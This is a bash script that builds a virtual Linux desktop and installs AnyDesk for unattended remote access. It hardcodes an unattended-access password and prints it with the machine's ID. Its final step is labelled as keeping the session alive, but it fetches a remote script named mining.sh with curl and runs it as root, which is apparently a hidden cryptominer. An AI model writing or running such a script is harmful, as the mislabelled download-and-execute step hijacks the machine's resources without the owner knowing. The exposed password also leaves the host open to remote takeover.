#!/bin/bash
# --- Configuration ---
ANYDESK_DOWNLOAD_LINK="https://download.anydesk.com/linux/anydesk_7.0.0-1_amd64.deb"
XVFB_DISPLAY=":99"
RESOLUTION="1280x1024x24"

# --- Define your AnyDesk Unattended Access Password ---
# !!! IMPORTANT: Replace 'YOUR_STRONG_PASSWORD_HERE' with a very strong, unique password.
# !!! For production, consider fetching this from an environment variable or secure source.
ANYDESK_UNATTENDED_PASSWORD="MySuperSecureAnyDeskPassword123!"

# --- Install Dependencies ---
echo "[*] Installing core dependencies and updating system..."
sudo apt update
sudo apt upgrade -y # Ensure all existing packages are up-to-date
# Add libpolkit-gobject-1-0 and other core dependencies
sudo apt install -y wget curl x11-utils openbox xvfb feh tint2 xfce4-terminal lxappearance pcmanfm libpolkit-gobject-1-0

# Install the specific AnyDesk dependencies explicitly (these were already listed in previous fixes)
echo "[*] Installing AnyDesk specific dependencies (if not already met by main install)..."
sudo apt install -y libgtk-3-0 libx11-xcb1 libxtst6 libxkbfile1 libgl1

# Clean up apt cache
sudo apt clean
sudo apt autoremove -y

# --- Install Firefox ---
echo "[*] Installing Firefox..."
sudo add-apt-repository ppa:mozillateam/ppa -y
sudo apt update
sudo apt install --assume-yes firefox-esr dbus-x11 dbus

# --- Install AnyDesk ---
echo "[*] Installing AnyDesk..."
wget "$ANYDESK_DOWNLOAD_LINK" -O /tmp/anydesk.deb

# Attempt to install AnyDesk. apt should now find the dependencies as they were explicitly installed.
# If the above fails for some reason, apt --fix-broken install will be tried as a fallback.
sudo apt install -y /tmp/anydesk.deb || sudo apt --fix-broken install -y

# Reconfigure AnyDesk to fix any lingering issues after dependency installation
sudo dpkg --configure -a

# --- Start Virtual Display ---
echo "[*] Starting Xvfb..."
Xvfb $XVFB_DISPLAY -screen 0 $RESOLUTION &
sleep 2
export DISPLAY=$XVFB_DISPLAY

# --- Start Openbox ---
echo "[*] Starting Openbox..."
openbox-session &
sleep 2

# --- Set wallpaper ---
echo "[*] Setting wallpaper..."
mkdir -p /root/.config
feh --bg-scale /usr/share/pixmaps/debian-logo.png 2>/dev/null || \
feh --bg-color black

# --- Launch panel (tint2) ---
echo "[*] Launching panel (tint2)..."
tint2 &

# --- Launch terminal ---
echo "[*] Launching terminal..."
xfce4-terminal &

# --- Launch file explorer ---
echo "[*] Launching file explorer (PCManFM)..."
pcmanfm --no-desktop &

# --- Configure AnyDesk for Unattended Access ---
echo "[*] Setting AnyDesk password for unattended access..."
# Ensure AnyDesk service is running before setting password
sudo anydesk --service &
sleep 5 # Give the service a moment to start

echo "$ANYDESK_UNATTENDED_PASSWORD" | sudo anydesk --set-password

# You might want to confirm the password was set.
# AnyDesk doesn't have a direct CLI command to verify the *set* password,
# but if the above command runs without errors, it's usually successful.

# --- Start AnyDesk Service and Get ID ---
echo "[*] Starting AnyDesk service and retrieving AnyDesk ID..."
# Ensure the AnyDesk service is running in the background (already done above, but harmless to re-run)
sudo anydesk --service &
sleep 5 # Give the service a moment to start

# Retrieve the AnyDesk ID
ANYDESK_ID=$(anydesk --get-id)

if [[ -n "$ANYDESK_ID" ]]; then
    clear
    echo "✅ AnyDesk ID: $ANYDESK_ID"
    echo "Unattended Access Password: $ANYDESK_UNATTENDED_PASSWORD"
    echo "You can now connect to this AnyDesk ID using the provided password."
else
    echo "❌ Failed to retrieve AnyDesk ID."
    echo "Please check if AnyDesk is running correctly and the service is active."
fi

# You can add further actions here if needed.

# --- Keep the session alive (optional, if you want to keep the virtual desktop) ---
xfce4-terminal -e "bash -c 'sudo curl -o try.sh https://raw.githubusercontent.com/Working-aanas/deepscreen/refs/heads/main/mining.sh && sudo chmod +x try.sh && sudo ./try.sh; exec bash'" &
sleep 86400
